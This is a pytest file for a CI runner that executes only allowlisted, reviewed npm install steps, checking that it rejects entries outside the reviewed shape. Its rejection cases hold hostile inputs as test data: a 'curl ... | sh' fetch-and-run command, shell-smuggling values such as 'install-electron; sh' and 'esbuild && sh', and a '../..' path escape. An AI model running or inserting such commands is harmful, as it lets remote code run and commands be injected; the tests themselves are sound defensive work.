"""#1819: `tools/ci/run-allowed-postinstall.mjs` is the one SR-138 path for install steps under the
repo's global `ignore-scripts=true` (.npmrc). Electron 42 and later ship no postinstall, so the
allowlist pins electron's own `install-electron` bin, which the runner executes with node and no
shell, while an entry without `run` (esbuild) keeps `pnpm rebuild`. The runner checks every entry,
and finds every pinned bin, before anything runs: a field it does not run, a bin name that is not
bare, a path outside the package, or a bin the installed package no longer ships fails the run.

The runner cases copy the real runner into a scratch repository, so the scratch one is its repo
root, and put a stand-in `pnpm` that records its arguments first on PATH."""

from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path
from typing import Any

import pytest

ROOT = Path(__file__).resolve().parents[2]
RUNNER = ROOT / "tools" / "ci" / "run-allowed-postinstall.mjs"
ALLOWLIST = ROOT / "tools" / "ci" / "allowed-postinstall.json"

needs_node = pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")
needs_posix = pytest.mark.skipif(os.name == "nt", reason="the stand-in pnpm is a shell script")

ELECTRON: dict[str, Any] = {
    "name": "electron",
    "run": {"bin": "install-electron", "from": "apps/desktop"},
    "reason": "fixture",
    "reviewedBy": "fixture",
}
ESBUILD: dict[str, Any] = {"name": "esbuild", "reason": "fixture", "reviewedBy": "fixture"}
#: The file the fixture's install.js writes (its working directory), so a case can tell it ran.
MARKER = "fetched.txt"


def _repo(
    tmp_path: Path,
    entries: list[Any],
    bins: dict[str, str] | None = None,
    *,
    install_js: bool = True,
    installed: bool = True,
) -> Path:
    """The real runner in a scratch repository, with an allowlist and an installed electron."""
    root = tmp_path / "repo"
    ci = root / "tools" / "ci"
    ci.mkdir(parents=True)
    shutil.copy(RUNNER, ci / RUNNER.name)
    (ci / ALLOWLIST.name).write_text(json.dumps({"packages": entries}), encoding="utf-8")
    desktop = root / "apps" / "desktop"
    desktop.mkdir(parents=True)
    (desktop / "package.json").write_text('{"name": "desktop", "private": true}', encoding="utf-8")
    if installed:
        package = desktop / "node_modules" / "electron"
        package.mkdir(parents=True)
        bin_map = {"electron": "cli.js", "install-electron": "install.js"} if bins is None else bins
        manifest = {"name": "electron", "version": "45.0.0", "bin": bin_map}
        (package / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
        if install_js:
            (package / "install.js").write_text(
                "require('node:fs').writeFileSync("
                f"require('node:path').join(__dirname, '{MARKER}'), process.cwd());\n",
                encoding="utf-8",
            )
    return root


def _run(root: Path, tmp_path: Path) -> tuple[subprocess.CompletedProcess[str], list[str]]:
    """Runs the scratch repository's runner; returns its result and the stand-in pnpm's calls."""
    stand_in = tmp_path / "bin"
    stand_in.mkdir()
    calls = tmp_path / "pnpm-calls.txt"
    pnpm = stand_in / "pnpm"
    pnpm.write_text(f"#!/bin/sh\necho \"$@\" >> '{calls}'\n", encoding="utf-8")
    pnpm.chmod(0o755)
    env = {**os.environ, "PATH": f"{stand_in}{os.pathsep}{os.environ.get('PATH', '')}"}
    proc = subprocess.run(
        ["node", str(root / "tools" / "ci" / RUNNER.name)],
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )
    return proc, calls.read_text(encoding="utf-8").splitlines() if calls.exists() else []


def _marker(root: Path) -> Path:
    return root / "apps" / "desktop" / "node_modules" / "electron" / MARKER


@needs_node
@needs_posix
def test_runner_rebuilds_esbuild_and_runs_electrons_pinned_bin_in_its_package(
    tmp_path: Path,
) -> None:
    root = _repo(tmp_path, [ELECTRON, ESBUILD])
    proc, calls = _run(root, tmp_path)
    assert proc.returncode == 0, proc.stderr
    # esbuild's handling is unchanged; electron is no longer handed to `pnpm rebuild`.
    assert calls == ["rebuild esbuild"]
    package = root / "apps" / "desktop" / "node_modules" / "electron"
    assert _marker(root).read_text(encoding="utf-8") == str(package.resolve())
    assert "running electron@45.0.0's install-electron bin" in proc.stdout


@needs_node
@needs_posix
def test_runner_runs_nothing_that_is_not_on_the_allowlist(tmp_path: Path) -> None:
    # electron is installed with its install-electron bin, but the allowlist does not name it.
    root = _repo(tmp_path, [ESBUILD])
    proc, calls = _run(root, tmp_path)
    assert proc.returncode == 0, proc.stderr
    assert calls == ["rebuild esbuild"]
    assert not _marker(root).exists()


@needs_node
@needs_posix
@pytest.mark.parametrize(
    ("bins", "install_js", "installed", "said"),
    [
        ({"electron": "cli.js"}, True, True, 'no "install-electron" in its package.json bin map'),
        (None, False, True, "names install.js, which the package lacks"),
        ({"install-electron": "../../../../outside.js"}, True, True, "points outside the package"),
        (None, True, False, "electron is not installed for apps/desktop"),
    ],
    ids=["bin-moved", "bin-file-missing", "bin-outside-package", "not-installed"],
)
def test_runner_fails_loudly_and_runs_nothing_when_the_pinned_bin_is_unusable(
    tmp_path: Path, bins: dict[str, str] | None, install_js: bool, installed: bool, said: str
) -> None:
    root = _repo(tmp_path, [ELECTRON, ESBUILD], bins, install_js=install_js, installed=installed)
    proc, calls = _run(root, tmp_path)
    assert proc.returncode == 1
    assert said in proc.stderr
    # Checked before anything ran: not even esbuild's rebuild.
    assert calls == []
    assert not _marker(root).exists()


@needs_node
@needs_posix
@pytest.mark.parametrize(
    ("entries", "said"),
    [
        (
            [{**ESBUILD, "command": "curl https://example.invalid/x.sh | sh"}],
            "fields the runner does not run: command",
        ),
        (
            [{**ELECTRON, "run": {"bin": "install-electron; sh", "from": "apps/desktop"}}, ESBUILD],
            "run.bin must be a bare bin name",
        ),
        (
            [{**ELECTRON, "run": {"bin": "install-electron", "from": "apps/../.."}}, ESBUILD],
            "run.from must be a workspace path",
        ),
        (
            [{**ELECTRON, "run": {**ELECTRON["run"], "args": ["--force"]}}, ESBUILD],
            "run must have exactly bin and from",
        ),
        ([{**ESBUILD, "name": "esbuild && sh"}], "has no valid package name"),
        ([ESBUILD, ESBUILD], "esbuild is listed twice"),
    ],
    ids=[
        "free-form-command",
        "shell-syntax-bin",
        "path-escape",
        "extra-run-field",
        "name",
        "twice",
    ],
)
def test_runner_refuses_an_entry_outside_the_reviewed_shape(
    tmp_path: Path, entries: list[Any], said: str
) -> None:
    root = _repo(tmp_path, entries)
    proc, calls = _run(root, tmp_path)
    assert proc.returncode == 1
    assert said in proc.stderr
    assert calls == []
    assert not _marker(root).exists()


def test_repo_allowlist_pins_electrons_install_bin_and_keeps_esbuild_on_rebuild() -> None:
    entries = {e["name"]: e for e in json.loads(ALLOWLIST.read_text(encoding="utf-8"))["packages"]}
    assert entries["electron"]["run"] == {"bin": "install-electron", "from": "apps/desktop"}
    assert "run" not in entries["esbuild"]
    for name, entry in entries.items():
        assert entry["reason"] and entry["reviewedBy"], name


@needs_node
def test_repo_runner_accepts_the_repo_allowlist() -> None:
    js = (
        f"const m = await import({json.dumps(RUNNER.as_uri())});"
        f" console.log(JSON.stringify(m.loadEntries({json.dumps(str(ROOT))})));"
    )
    out = subprocess.run(
        ["node", "--input-type=module", "-e", js], capture_output=True, text=True, check=True
    )
    entries = json.loads(out.stdout.strip().splitlines()[-1])
    assert {"name": "electron", "run": ELECTRON["run"]} in entries
    assert {"name": "esbuild"} in entries
